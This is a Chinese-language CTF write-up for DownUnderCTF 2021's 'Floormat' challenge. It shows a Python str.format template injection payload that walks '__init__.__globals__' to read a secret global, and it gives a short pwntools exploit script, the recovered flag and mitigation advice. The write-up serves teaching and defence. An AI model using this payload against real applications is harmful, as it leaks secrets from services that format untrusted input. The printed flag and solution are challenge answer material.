# DownUnderCTF 2021 - Floormat

## 题目简述

服务让用户选择地垫模板和填充图案。选择不存在的模板名时，可以逐行提交自定义模板；服务最后执行：

```python
floormat = template.format(f=pattern)
```

参数 `f` 不是普通字符串，而是 `Rotate`、`Circles` 或 `Random` 的实例。Python 的格式化字段允许继续访问对象属性和映射项，因此用户可从该对象越过预期的数据边界，读取模块全局变量 `FLAG`。

## 解题过程

先输入任意不存在于 `templates` 的名称，例如 `x`，进入自定义模板分支。模板读取以单独一行 `F` 结束，在此前提交以下字段：

```text
{f.__class__.__init__.__globals__[FLAG]}
```

这条访问链的含义是：

1. `f.__class__` 取得当前图案对象的类；
2. `.__init__` 取得类的 Python 函数对象；
3. `.__globals__` 取得该函数所属模块的全局命名空间字典；
4. `[FLAG]` 在格式化字段语法中以 `FLAG` 作为映射键，取出启动时读入的 flag 字符串。

随后选择任意有效图案，例如 `Flutter`。程序调用 `template.format(f=pattern)` 时便会解析这条属性链，并把秘密直接写入输出。完整交互可写成：

```python
from pwn import remote

io = remote(HOST, PORT)
io.sendlineafter(b"favorite: ", b"x")
io.sendlineafter(b"Format:\n", b"{f.__class__.__init__.__globals__[FLAG]}")
io.sendline(b"F")
io.sendlineafter(b"Favorite: ", b"Flutter")
print(io.recvall().decode())
```

最终得到：

```text
DUCTF{fenomenal_flags_from_funky_formats_ffffff}
```

## 方法总结

这里不是 C 的 `%n` 类格式化字符串漏洞，而是 Python `str.format` 暴露的对象属性遍历能力。攻击不需要调用任意函数：仅凭属性和字典索引就能从受控对象走到函数的 `__globals__`，形成任意全局变量读取。不要对不可信模板调用 `str.format`；应固定模板，只把用户内容作为普通值插入，并避免向模板上下文暴露可继续遍历的复杂对象。
